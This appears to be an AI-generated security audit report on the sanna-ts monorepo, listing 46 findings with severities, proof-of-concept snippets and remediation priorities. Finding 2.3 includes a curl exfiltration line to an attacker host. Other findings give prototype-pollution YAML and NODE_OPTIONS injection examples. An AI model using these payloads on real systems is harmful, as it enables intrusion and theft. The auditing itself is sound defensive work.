# Security Audit Report: sanna-ts Monorepo

**Date:** 2026-03-26
**Auditor:** Claude Code (automated deep audit)
**Scope:** Full monorepo — crypto, constitution parsing, gateway, interceptors, receipts, input validation, MCP server, dependencies, secrets
**Status:** AUDIT ONLY — no changes made

---

## Executive Summary

The sanna-ts monorepo demonstrates strong security fundamentals: correct use of Node.js native Ed25519 crypto, parameterized SQL queries, proper key material handling, and good test coverage. However, the audit identified **46 findings** across 10 audit areas, including several exploitable issues in the gateway, interceptors, and constitution parsing layers.

| Severity | Count |
|----------|-------|
| CRITICAL | 1 |
| HIGH     | 9 |
| MEDIUM   | 22 |
| LOW      | 8 |
| INFO     | 6 |

---

## 1. CRYPTO (packages/core/src/crypto.ts, hashing.ts)

### 1.1 Ed25519 Key ID Extraction — No Length Validation
- **Severity:** INFO
- **File:** `packages/core/src/crypto.ts:94`
- **Description:** `getKeyId()` assumes Ed25519 SPKI DER is always exactly 44 bytes and extracts the last 32 bytes via `raw.subarray(raw.length - 32)`. No explicit length assertion.
- **Impact:** If Node.js ever changes SPKI format (extremely unlikely), key extraction could silently return wrong bytes.
- **Exploitable:** No — theoretical only.

### 1.2 Error Message Leakage in Verifier
- **Severity:** LOW
- **File:** `packages/core/src/verifier.ts:123`
- **Description:** `catch (e) { errors.push(\`Signature verification error: ${e}\`) }` — converts exception to string via template literal. Node.js crypto errors are safe, but pattern could leak details if error sources change.
- **Impact:** Minor information disclosure.
- **Exploitable:** No.

### 1.3 Crypto Positive Findings
- Ed25519 via `generateKeyPairSync("ed25519")` — correct.
- `cryptoSign(null, data, privateKey)` / `cryptoVerify(null, data, publicKey, sigBuf)` — correct for Ed25519.
- No timing-unsafe comparisons on secret material. Key ID comparisons use `!==` on non-secret hex strings — acceptable.
- Private keys stored as opaque `KeyObject`, never logged or serialized except via explicit `exportPrivateKeyPem()`.
- `randomUUID()` from node:crypto — cryptographically secure.
- RFC 8785 JCS canonicalization via `canonicalize` library — correct implementation with proper undefined/null handling.

---

## 2. CONSTITUTION PARSING (packages/core/src/constitution.ts, evaluator.ts, invariants.ts)

### 2.1 YAML Loading Without Explicit Safe Schema
- **Severity:** CRITICAL
- **File:** `packages/core/src/constitution.ts:573`, `packages/gateway/src/config.ts:251`, `packages/mcp-server/src/index.ts:38`
- **Description:** `yaml.load(content)` is called without specifying `schema: yaml.JSON_SCHEMA` or `schema: yaml.FAILSAFE_SCHEMA`. While js-yaml v4.1.0 defaults to `DEFAULT_SCHEMA` (which is safe against `!!js/function`), this is not defense-in-depth. If a future dependency or bundling change regresses to js-yaml v3 behavior, code execution via YAML constructors becomes possible.
- **Impact:** Potential RCE if js-yaml version regresses or custom schema tags are registered.
- **Exploitable:** Theoretical in current version; exploitable if js-yaml is downgraded.

### 2.2 Prototype Pollution via Identity Extensions
- **Severity:** HIGH
- **File:** `packages/core/src/constitution.ts:359-361, 624`
- **Description:** Arbitrary keys from YAML identity section are stored in `extensions` object, then merged via `Object.assign(identityDict, c.identity.extensions)`. An attacker can inject `__proto__` or `constructor` keys.
- **Impact:** Prototype pollution leading to potential authorization bypass or signature forgery.
- **Exploitable:** YES — a malicious constitution with `__proto__: {trusted: true}` in the identity section.
- **PoC:**
  ```yaml
  identity:
    agent_name: "evil"
    __proto__:
      forged_signature: "true"
  ```

### 2.3 Escalation Target URLs Not Validated
- **Severity:** HIGH
- **File:** `packages/core/src/constitution.ts:437-443`
- **Description:** Escalation target `url` and `handler` fields are stored without URL format validation, allowlisting, or shell metacharacter filtering.
- **Impact:** SSRF, credential theft, or command injection if escalation handlers execute system commands.
- **Exploitable:** YES — malicious constitution specifies `handler: "curl https://attacker.com/exfil?data="`.

### 2.4 Glob Pattern Normalization Bypass via Separatorless Fallback
- **Severity:** HIGH
- **File:** `packages/core/src/evaluator.ts:79-104`
- **Description:** The authority matching logic has a separatorless fallback that strips ALL non-alphanumeric characters. Pattern `read_file` (normalized to `read.file`) could match `readfile` via stripping. Action `deleteexecute` could pass a `delete` boundary.
- **Impact:** Authority boundary bypass — unintended actions could match rules.
- **Exploitable:** YES.

### 2.5 Unsigned Constitution Silently Accepted
- **Severity:** MEDIUM
- **File:** `packages/core/src/constitution.ts:756-773`
- **Description:** `verifyConstitutionSignature()` returns `false` (not throws) for unsigned constitutions. Callers that don't check the return value will silently operate on untrusted constitutions.
- **Impact:** Loading of unauthenticated constitutions.
- **Exploitable:** YES — depends on calling code.

### 2.6 Unbounded Identity Extension Nesting
- **Severity:** MEDIUM
- **File:** `packages/core/src/constitution.ts:356-367`
- **Description:** Identity extensions accept arbitrary nested objects without depth or size limits. Deep nesting could cause stack overflow during canonicalization.
- **Impact:** DoS via deeply nested objects.
- **Exploitable:** YES.

### 2.7 Incomplete CLI Binary Character Filtering
- **Severity:** LOW
- **File:** `packages/core/src/constitution.ts:195-199`
- **Description:** CLI binary names reject `/\*?` but allow `$`, `&`, `;`, `|` — shell-dangerous characters.
- **Impact:** Command injection if binary names are used in shell contexts downstream.
- **Exploitable:** Conditional on downstream usage.

### 2.8 NFKC Normalization in Evaluator
- **Severity:** LOW
- **File:** `packages/core/src/evaluator.ts:57`
- **Description:** Uses NFKC (compatibility decomposition) instead of NFC. Kelvin symbol (℃) becomes °C, etc. Could cause unexpected authority boundary behavior with international characters.
- **Exploitable:** Theoretical.

---

## 3. GATEWAY (packages/gateway/src/)

### 3.1 Downstream Env Variable Injection (LD_PRELOAD, NODE_OPTIONS)
- **Severity:** HIGH
- **File:** `packages/gateway/src/config.ts:318-324`, `packages/gateway/src/downstream.ts:71-73`
- **Description:** YAML config `env` values are merged directly into child process environment. The env allowlist prevents *gateway secrets* from leaking, but does NOT block injection of dangerous variables like `LD_PRELOAD`, `NODE_OPTIONS`, `DYLD_INSERT_LIBRARIES`, or `PATH`.
- **Impact:** RCE via downstream child process for anyone with config file write access.
- **Exploitable:** YES (requires config file access).
- **PoC:**
  ```yaml
  downstreams:
    - name: exploit
      command: node
      env:
        NODE_OPTIONS: "--require /malicious/hook.js"
  ```

### 3.2 Tool Name Injection via Downstream Spoofing
- **Severity:** MEDIUM
- **File:** `packages/gateway/src/tool-namespace.ts:26-34`
- **Description:** Namespace parser splits on first `_` only. Downstream servers can register tool names containing `_` to create confusion (e.g., tool `server_other` from downstream `other` becomes `other_server_other`, appearing as if from `other_server`). Tool names from downstreams are NOT validated.
- **Impact:** Tool spoofing between downstreams; policy rules could target wrong tool.
- **Exploitable:** YES.

### 3.3 Escalation Args Modification Before Approval
- **Severity:** MEDIUM
- **File:** `packages/gateway/src/gateway.ts:374-379`
- **Description:** When an escalation is approved, stored `esc.args` are re-executed. If the escalation store file is writable (typically in `/tmp`), args can be modified between creation and approval. The approval process validates only the token, not the args.
- **Impact:** Escalation approval weaponized to execute different operations than originally requested.
- **Exploitable:** YES (requires file write access to escalation store).

### 3.4 PII Redaction DoS via Large Strings
- **Severity:** MEDIUM
- **File:** `packages/gateway/src/pii.ts:143-149`
- **Description:** No length limit on individual string redaction. A downstream could return multi-megabyte strings containing PII patterns, causing memory exhaustion during regex matching.
- **Impact:** DoS via CPU/memory exhaustion.
- **Exploitable:** YES (requires malicious downstream).

### 3.5 IPv6 Reserved Range Coverage Gap in Webhook SSRF Protection
- **Severity:** MEDIUM
- **File:** `packages/gateway/src/webhook.ts:52-65, 98-105`
- **Description:** Private IP check covers RFC 1918 IPv4, loopback, link-local, and fc00::/fe80:: IPv6. Missing: documentation prefix `2001:db8::/32`, IPv4-mapped IPv6 `::ffff:10.x.x.x`, and other reserved ranges.
- **Impact:** Potential SSRF bypass via unchecked IPv6 reserved addresses.
- **Exploitable:** Theoretical (attacker needs DNS control).

### 3.6 Windows Config File Permission Check Missing
- **Severity:** MEDIUM
- **File:** `packages/gateway/src/config.ts:234-245`
- **Description:** File permission warnings are skipped entirely on Windows (`platform() !== "win32"`). Config files containing HMAC secrets could be world-readable on Windows without warning.
- **Impact:** Undetected credential leakage on Windows.
- **Exploitable:** Depends on Windows ACLs.

### 3.7 Escalation Token Length Check Timing Leak
- **Severity:** LOW
- **File:** `packages/gateway/src/escalation.ts:154-155`
- **Description:** Length check before `timingSafeEqual` is not timing-safe. SHA-256 hashes are always 64 hex chars so minimal practical impact, but sets a bad pattern.
- **Exploitable:** Theoretical.

### 3.8 Silent Signing Key Load Failure
- **Severity:** LOW
- **File:** `packages/gateway/src/gateway.ts:786-793`
- **Description:** If `signing_key_path` is configured but the key file is corrupted, `_signingKey` may remain null, producing unsigned receipts without operator warning.
- **Impact:** Loss of receipt authenticity.
- **Exploitable:** Requires key file corruption.

### 3.9 File Delivery Race Condition
- **Severity:** LOW
- **File:** `packages/gateway/src/file-delivery.ts:34-76`
- **Description:** Token file is read → modified → written without file locking. Concurrent writes from multiple gateway instances can lose tokens.
- **Impact:** Lost escalation tokens.
- **Exploitable:** YES (multi-process environments).

---

## 4. CHILD PROCESS INTERCEPTOR (packages/core/src/interceptors/child-process-interceptor.ts)

### 4.1 Environment Variable Values Not Hashed
- **Severity:** MEDIUM
- **File:** `packages/core/src/interceptors/child-process-interceptor.ts:136-143`
- **Description:** `getEnvKeys()` hashes only env variable **keys**, not values. Attacker can inject `NODE_OPTIONS="--require /evil"` without changing the input hash.
- **Impact:** Policy bypass — malicious env values undetected in audit trail.
- **Exploitable:** YES.
- **PoC:**
  ```typescript
  spawnSync('node', ['app.js'], {
    env: { ...process.env, NODE_OPTIONS: '--require /malicious.js' }
  });
  // Same input_hash as clean invocation
  ```

### 4.2 Incomplete Shell Metacharacter Parsing
- **Severity:** MEDIUM
- **File:** `packages/core/src/interceptors/child-process-interceptor.ts:58-91`
- **Description:** Shell operator regex `/[;|&`]|\$\(/` misses `<(...)` process substitution, nested subshells `$(echo $(whoami))`, and escaped quotes. Quote stripping regex doesn't handle `\"` or `\'`.
- **Impact:** Bypassed command detection for halted/escalated operations.
- **Exploitable:** YES with crafted inputs.

### 4.3 Binary Path Bypass via path.basename
- **Severity:** MEDIUM
- **File:** `packages/core/src/interceptors/child-process-interceptor.ts:68, 319, 459, 521, 589, 639`
- **Description:** Binary extraction uses `path.basename()`. Constitution rules using relative names can be matched by any absolute path to the same binary. Symlinks also bypass.
- **Impact:** CLI permission bypass.
- **Exploitable:** YES with PATH manipulation.

### 4.4 Process Substitution Not Detected
- **Severity:** INFO
- **File:** `packages/core/src/interceptors/child-process-interceptor.ts:58`
- **Description:** Bash process substitution (`<(...)`, `>(...)`) not detected by SHELL_OPERATORS regex.
- **Impact:** Incomplete sub-command analysis.

---

## 5. FETCH INTERCEPTOR (packages/core/src/interceptors/fetch-interceptor.ts)

### 5.1 No SSRF Protection on HTTP Requests
- **Severity:** HIGH
- **File:** `packages/core/src/interceptors/fetch-interceptor.ts:284-296`
- **Description:** `buildUrlFromHttpArgs()` constructs URLs from http.request options with NO validation for private/internal IPs. Accepts `127.0.0.1`, `169.254.169.254`, RFC 1918 addresses.
- **Impact:** SSRF to internal services, cloud metadata endpoints, localhost databases.
- **Exploitable:** YES — critical in cloud/container environments.

### 5.2 Exclude Pattern Bypass via Case/Unicode
- **Severity:** HIGH
- **File:** `packages/core/src/interceptors/fetch-interceptor.ts:65-75, 416`
- **Description:** Glob matching for exclude patterns is case-sensitive and does not normalize Unicode. `HTTPS://API.SANNA.CLOUD/` bypasses `https://api.sanna.cloud/*`. Full-width Unicode characters (`sａnna.cloud` vs `sanna.cloud`) also bypass.
- **Impact:** Bypass of sanna.cloud exclusions.
- **Exploitable:** YES.

### 5.3 Async Re-entrancy Guard Race Condition
- **Severity:** MEDIUM
- **File:** `packages/core/src/interceptors/fetch-interceptor.ts:191-202, 334-335, 400`
- **Description:** `_state.inIntercept` flag is not atomic. During `await emitHttpReceipt()`, concurrent requests see `inIntercept=true` and bypass interception entirely via the original fetch.
- **Impact:** Concurrent requests bypass policy enforcement.
- **Exploitable:** YES — practical with `Promise.all()`.

### 5.4 http.request Receipt Emission Not Awaited
- **Severity:** MEDIUM
- **File:** `packages/core/src/interceptors/fetch-interceptor.ts:361`
- **Description:** In `createPatchedHttpRequest`, `emitHttpReceipt()` is called but NOT awaited, and errors are silently swallowed. The re-entrancy flag resets before receipt stores complete.
- **Impact:** Silent audit trail loss for http/https module requests.
- **Exploitable:** No (integrity issue, not control bypass).

### 5.5 Redirect Destination Not Validated
- **Severity:** MEDIUM
- **File:** `packages/core/src/interceptors/fetch-interceptor.ts` (general)
- **Description:** Interceptor checks only the initial request URL. 302 redirects to blocked URLs are followed automatically by the fetch API without re-interception.
- **Impact:** Allowed endpoint redirects to internal service, bypassing policy.
- **Exploitable:** YES (depends on server behavior).

### 5.6 Monkey-Patching Reversible by Malicious Code
- **Severity:** MEDIUM
- **File:** Both interceptors (child-process:675-689, fetch:419-430)
- **Description:** After patching, any code with module access can unpatch or replace the interceptor. Original functions stored in `_state.originals` could potentially be accessed.
- **Impact:** Complete interception bypass.
- **Exploitable:** YES (requires prior code execution).

---

## 6. RECEIPT INTEGRITY (packages/core/src/receipt.ts, verifier.ts)

### 6.1 content_mode/content_mode_source Not in Fingerprint — Post-Signature Tampering
- **Severity:** HIGH
- **File:** `packages/core/src/receipt.ts:326-327`
- **Description:** `content_mode` and `content_mode_source` are explicitly excluded from fingerprint computation but present in the signed receipt object. However, they are metadata fields set AFTER the signable form is constructed. An attacker who modifies these fields on a signed receipt will NOT break the signature.
- **Impact:** Attacker can claim content is "redacted" when it's "full" or vice versa. If downstream systems make security decisions based on these fields, they can be spoofed.
- **Exploitable:** YES — requires ability to modify signed receipts in transit/storage.

### 6.2 EMPTY_HASH Collision: Empty String vs. Null workflow_id
- **Severity:** MEDIUM
- **File:** `packages/core/src/receipt.ts:114-116`
- **Description:** `workflow_id: ""` and `workflow_id: null` both produce EMPTY_HASH in the fingerprint. `hashContent("")` returns SHA-256 of empty bytes after normalization, which equals EMPTY_HASH.
- **Impact:** Semantic ambiguity — a receipt can be changed from null to empty-string workflow_id without fingerprint detection. Signature still protects.
- **Exploitable:** No (signature catches it).

### 6.3 Timestamp Allows 5-Minute Future Skew
- **Severity:** MEDIUM
- **File:** `packages/core/src/verifier.ts:243-246`
- **Description:** `parsed.getTime() > now + 5 * 60 * 1000` — receipts timestamped up to 5 minutes in the future pass validation.
- **Impact:** Limited abuse for future-dating events.
- **Exploitable:** Limited.

### 6.4 Null vs. Undefined Handling Inconsistency
- **Severity:** LOW
- **File:** `packages/core/src/receipt.ts:313-333`
- **Description:** Some fields use `!= null` (catches both null and undefined), others use `!== undefined` (only catches undefined). `parent_receipts: null` → field omitted; `event_type: null` → field included.
- **Impact:** Non-standard receipt construction could produce unexpected fingerprints.
- **Exploitable:** No.

---

## 7. INPUT VALIDATION

### 7.1 Number Coercion — NaN Bypass in Query Limit
- **Severity:** LOW
- **File:** `packages/mcp-server/src/server.ts:584-586`
- **Description:** `Number(args.limit)` — if limit is non-numeric string, produces NaN. NaN fails all comparisons, bypassing range checks `if (limit > MAX)` and `if (limit < 1)`. Database layer handles safely.
- **Exploitable:** Theoretical.

### 7.2 No Schema Validation After JSON.parse()
- **Severity:** LOW
- **File:** `packages/mcp-server/src/server.ts:551, 780, 834`
- **Description:** JSON.parse results are cast to types (`as Record<string, unknown>`, `as ApprovalRequest`) without runtime schema validation. Malformed files could cause unexpected behavior.
- **Exploitable:** Requires filesystem access.

---

## 8. MCP SERVER (packages/mcp-server/)

### 8.1 No Authorization Check on Tool Execution
- **Severity:** MEDIUM
- **File:** `packages/mcp-server/src/server.ts:903-918`
- **Description:** `CallToolRequestSchema` handler executes all 10 governance tools without authorization checks. Any caller with MCP transport access can invoke any tool.
- **Impact:** Full governance tool access for any connected client.
- **Exploitable:** YES (requires MCP transport access, protected by process isolation).

### 8.2 Arbitrary File Read via Path Parameters
- **Severity:** MEDIUM
- **File:** `packages/mcp-server/src/server.ts:439, 478, 482, 526, 556, 666, 684-685, 780, 799-800, 840`
- **Description:** All path parameters (`constitution_path`, `approval_path`, `signing_key_path`, `public_key_path`, `db_path`) are passed directly to file-reading functions without path validation. Attacker with MCP access could read `/etc/passwd` or private keys.
- **Impact:** Arbitrary file read.
- **Exploitable:** YES (requires MCP transport access).

### 8.3 No Input Size Validation on action_params
- **Severity:** LOW
- **File:** `packages/mcp-server/src/server.ts:424-438`
- **Description:** `handleEvaluateAuthority()` validates `action_name` size but NOT `action_params` object, which could be arbitrarily large.
- **Impact:** Memory exhaustion DoS.
- **Exploitable:** Theoretical (limited by MCP transport).

---

## 9. DEPENDENCIES

### 9.1 npm audit: 7 Vulnerabilities (6 High, 1 Moderate)
- **Severity:** HIGH
- **Description:** All fixable via `npm audit fix`.

| Package | Severity | CVE/Advisory | Notes |
|---------|----------|-------------|-------|
| `@hono/node-server` <1.19.10 | HIGH | GHSA-wc8c-qw6v-h7f6 | Auth bypass via encoded slashes. Transitive via `@modelcontextprotocol/sdk`. Reduced risk: gateway uses stdio, not HTTP. |
| `hono` <=4.12.6 | HIGH | 5 advisories | IP spoofing, cookie injection, SSE injection, file access, prototype pollution. Transitive via MCP SDK. |
| `express-rate-limit` 8.2.0-8.2.1 | HIGH | GHSA-46wh-pxpv-q5gq | IPv4-mapped IPv6 rate limit bypass. Transitive via MCP SDK. |
| `flatted` <=3.4.1 | HIGH | GHSA-25h7-pfq9-p65f | Unbounded recursion DoS + prototype pollution. Dev-only (eslint). |
| `picomatch` 4.0.0-4.0.3 | HIGH | GHSA-c2c7-rcm5-vvqj | ReDoS + method injection. Build-only (tsup). |
| `minimatch` 2.0.0-10.2.2 | HIGH | GHSA-7r86-cg39-jmmj | ReDoS via GLOBSTAR. Dev-only (eslint). |
| `brace-expansion` <5.0.5 | MODERATE | GHSA-f886-m6hf-6m8v | Zero-step sequence DoS. Dev-only. |

### 9.2 Wildcard Version Ranges for Internal Packages
- **Severity:** MEDIUM
- **File:** `packages/cli/package.json:29-30`, `packages/gateway/package.json:30`, `packages/mcp-server/package.json:30`
- **Description:** Internal `@sanna-ai/*` packages use `"*"` version ranges. In workspaces this resolves locally, but if published individually, `*` allows any version including future breaking changes.
- **Exploitable:** Theoretical (supply chain risk if packages are published).

---

## 10. SECRETS / CREDENTIALS

### 10.1 .gitignore Does Not Exclude Common Sensitive Patterns
- **Severity:** MEDIUM
- **File:** `.gitignore`
- **Description:** Does not exclude `.env`, `.env.*`, `*.pem`, `*.key` (outside spec/fixtures), `*.sqlite`, `*.db`. No such files exist currently, but no guardrail against accidental commits.
- **Exploitable:** Preventive finding.

### 10.2 Test Fixture Private Key (Intentional)
- **Severity:** INFO
- **File:** `spec/fixtures/keypairs/test-author.key`
- **Description:** Ed25519 test private key in PEM format. Intentional fixture for cross-language verification. Excluded by `.gitguardian.yaml`.
- **Exploitable:** No (test key only).

### 10.3 Positive Findings
- No `.env` files in repository.
- No hardcoded API keys, tokens, or passwords in source code.
- All API key handling uses environment variables or constructor parameters.
- Gateway env allowlist prevents secret leakage to child processes.
- Escalation tokens properly SHA-256 hashed at rest.
- No `eval()` or `new Function()` in source code.
- No CI/CD configs found to audit.

---

## Consolidated Findings Table

| # | Severity | Area | Finding | Exploitable |
|---|----------|------|---------|-------------|
| 2.1 | CRITICAL | Constitution | YAML loading without explicit safe schema | Theoretical |
| 2.2 | HIGH | Constitution | Prototype pollution via identity extensions | YES |
| 2.3 | HIGH | Constitution | Escalation target URLs not validated | YES |
| 2.4 | HIGH | Constitution | Glob pattern normalization bypass | YES |
| 3.1 | HIGH | Gateway | LD_PRELOAD/NODE_OPTIONS env injection to downstreams | YES |
| 5.1 | HIGH | Fetch Interceptor | No SSRF protection on HTTP requests | YES |
| 5.2 | HIGH | Fetch Interceptor | Exclude pattern bypass via case/unicode | YES |
| 6.1 | HIGH | Receipts | content_mode not in fingerprint, post-sign tampering | YES |
| 9.1 | HIGH | Dependencies | 6 high-severity npm audit vulnerabilities | N/A |
| 2.5 | MEDIUM | Constitution | Unsigned constitution silently accepted | YES |
| 2.6 | MEDIUM | Constitution | Unbounded identity extension nesting (DoS) | YES |
| 3.2 | MEDIUM | Gateway | Tool name injection via downstream spoofing | YES |
| 3.3 | MEDIUM | Gateway | Escalation args modifiable before approval | YES |
| 3.4 | MEDIUM | Gateway | PII redaction DoS via large strings | YES |
| 3.5 | MEDIUM | Gateway | IPv6 reserved range gap in webhook SSRF protection | Theoretical |
| 3.6 | MEDIUM | Gateway | Windows config file permission check missing | Depends |
| 4.1 | MEDIUM | Child Proc Interceptor | Env variable values not hashed | YES |
| 4.2 | MEDIUM | Child Proc Interceptor | Incomplete shell metacharacter parsing | YES |
| 4.3 | MEDIUM | Child Proc Interceptor | Binary path bypass via path.basename | YES |
| 5.3 | MEDIUM | Fetch Interceptor | Async re-entrancy guard race condition | YES |
| 5.4 | MEDIUM | Fetch Interceptor | http.request receipt emission not awaited | No |
| 5.5 | MEDIUM | Fetch Interceptor | Redirect destination not re-validated | YES |
| 5.6 | MEDIUM | Both Interceptors | Monkey-patching reversible by malicious code | YES |
| 6.2 | MEDIUM | Receipts | EMPTY_HASH collision for null vs empty string | No |
| 6.3 | MEDIUM | Receipts | 5-minute future timestamp tolerance | Limited |
| 8.1 | MEDIUM | MCP Server | No authorization check on tool execution | YES |
| 8.2 | MEDIUM | MCP Server | Arbitrary file read via path parameters | YES |
| 9.2 | MEDIUM | Dependencies | Wildcard version ranges for internal packages | Theoretical |
| 10.1 | MEDIUM | Secrets | .gitignore missing sensitive file exclusions | Preventive |
| 1.2 | LOW | Crypto | Error message leakage in verifier | No |
| 2.7 | LOW | Constitution | Incomplete CLI binary character filtering | Conditional |
| 2.8 | LOW | Constitution | NFKC normalization may cause unexpected matching | Theoretical |
| 3.7 | LOW | Gateway | Escalation token length check timing leak | Theoretical |
| 3.8 | LOW | Gateway | Silent signing key load failure | Requires corruption |
| 3.9 | LOW | Gateway | File delivery race condition | YES |
| 6.4 | LOW | Receipts | Null vs undefined handling inconsistency | No |
| 7.1 | LOW | Input Validation | NaN bypass in query limit | Theoretical |
| 7.2 | LOW | Input Validation | No schema validation after JSON.parse | Requires FS access |
| 8.3 | LOW | MCP Server | No input size validation on action_params | Theoretical |
| 1.1 | INFO | Crypto | No explicit SPKI length assertion | No |
| 4.4 | INFO | Child Proc Interceptor | Process substitution not detected | No |
| 10.2 | INFO | Secrets | Test fixture private key (intentional) | No |

---

## Remediation Priority

### P0 — Fix Immediately
1. **2.2** Prototype pollution in identity extensions — filter `__proto__`, `constructor`, `prototype` keys
2. **3.1** Downstream env variable injection — add denylist for `LD_PRELOAD`, `NODE_OPTIONS`, `DYLD_INSERT_LIBRARIES`, etc.
3. **5.1** Fetch interceptor SSRF — add private IP validation for http.request URLs
4. **9.1** Run `npm audit fix` to resolve 7 known vulnerabilities

### P1 — Fix Soon
5. **2.1** Add explicit `{ schema: yaml.JSON_SCHEMA }` to all `yaml.load()` calls
6. **2.3** Validate escalation target URLs with URL constructor and allowlist
7. **2.4** Remove or restrict separatorless glob fallback in evaluator
8. **5.2** Case-normalize and unicode-normalize URLs before exclude pattern matching
9. **6.1** Document that `content_mode` is advisory-only, or include in fingerprint
10. **8.2** Add path validation (resolve, check prefix) to MCP server file-reading tools

### P2 — Fix When Convenient
11. **3.2** Validate downstream tool names (reject underscores)
12. **3.3** Hash escalation args at creation, verify at approval
13. **4.1** Hash env variable values, not just keys
14. **5.3** Fix async re-entrancy guard (use per-request tracking instead of global flag)
15. **10.1** Add `.env*`, `*.pem`, `*.key`, `*.sqlite`, `*.db` to .gitignore

---

*End of audit report.*
